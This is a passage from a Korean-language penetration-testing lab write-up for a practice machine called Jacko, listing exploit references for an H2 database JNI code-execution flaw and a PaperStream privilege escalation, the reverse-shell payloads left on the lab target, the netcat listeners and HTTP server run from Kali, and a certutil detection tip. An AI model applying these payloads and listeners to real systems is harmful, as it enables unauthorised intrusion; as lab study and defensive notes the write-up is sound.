- `certutil.exe` 의 아웃바운드를 감시한다. LOLBin 다운로더 중에서도 탐지 시그니처가 가장 잘 정립된 축이다. 서버 계정이 certutil 로 외부 HTTP 를 치는 것은 정상 동작이 아니다.

## 9. 참고 자료

- EDB **49384** — H2 Database 1.4.199 JNI Code Execution: https://www.exploit-db.com/exploits/49384 (로컬 사본 `~/PG/Jacko/49384.txt`, CVE 없음)
- 원 연구 — Code White, *Exploiting H2 Database with native libraries and JNI*: https://codewhitesec.blogspot.com/2019/08/exploit-h2-database-native-libraries-jni.html
- EDB **49382** — PaperStream IP (TWAIN) 1.42.0.5685 LPE / **CVE-2018-16156**: https://www.exploit-db.com/exploits/49382 (권한상승 후보 경로. **이 박스에서 시도하지 않았다**)
- 볼트 내부 — `02. Pentest Essentials.md` §Jacko (외부 워크스루 요약)

## 남긴 흔적

**타겟(192.168.120.66)** — 정리한 기록이 없다. 다음 리버트 전까지 아래가 남아 있다고 봐야 한다.

- `C:\Windows\Temp\JNIScriptEngine.dll`
- `C:\Windows\Temp\reverse.exe` — **meterpreter/4444 판**(238,080B). 실행되지 않았을 가능성이 높지만 확인하지 않았다
- `C:\Users\tony\Desktop\reverse.exe` — `shell_reverse_tcp`/8082 판(7,680B). **이건 실행됐다**
- H2 DB 안의 별칭 두 개 — `System_load`, `JNIScriptEngine_eval`
- `jdbc:h2:~/test` — 접속 시점에 생성됐다면 H2 서비스 계정 홈에 `test.mv.db` `[가정]`

**Kali** — `python -m http.server 80`, `rlwrap nc -lnvp 135`, `rlwrap nc -lnvp 8082` 를 띄웠다. 종료를 확인한 기록은 없다(현재는 남아 있지 않다). 산출물 `~/PG/Jacko/` 5개는 보존.

## 관련 노트

- [[Flu]] — 같은 자리에 오래 멈춰 있던 박스다. 공개 익스플로잇으로 Foothold 만 잡고 `proof.txt` 를 못 얻은 채 1/2 였는데, **2026-08-20 재도전으로 2/2 가 됐다.** 잠긴 지점이 무엇이었는지(무응답을 실패로 오독) 그쪽 §6 에 있다. Jacko 가 지금 그 상태다
- [[Kevin]] · [[Slort]] · [[Access]] — msfvenom 페이로드를 쓴 다른 Windows 박스
- [[Squid]] — 셸을 잡았을 때 SYSTEM 이 **아니었던** 경우. `whoami` 한 줄이 갈림길인데, 이 박스는 그 한 줄조차 못 쳤다
- [[Hub]] · [[Levram]] · [[RubyDome]] · [[Squid]] · [[Twiggy]] · [[Kevin]] — 누적 패턴 **"버전 판정은 독립 근거 2개"**. 여기서는 nmap 지문의 `[90117-199]` + 콘솔 화면의 `1.4.199` 였다
- [[Crane]] · [[RubyDome]] · [[Astronaut]] · [[Exghost]] · [[Hawat]] · [[Squid]] — 누적 패턴 **"응답이 성공을 뜻하지 않는다"**. 이 박스에서는 뒤집힌 형태였다 — `System_load` 의 응답 `null` 이 **성공**이었다
- [[_STATUS]] — PG 283개 전수 진행현황
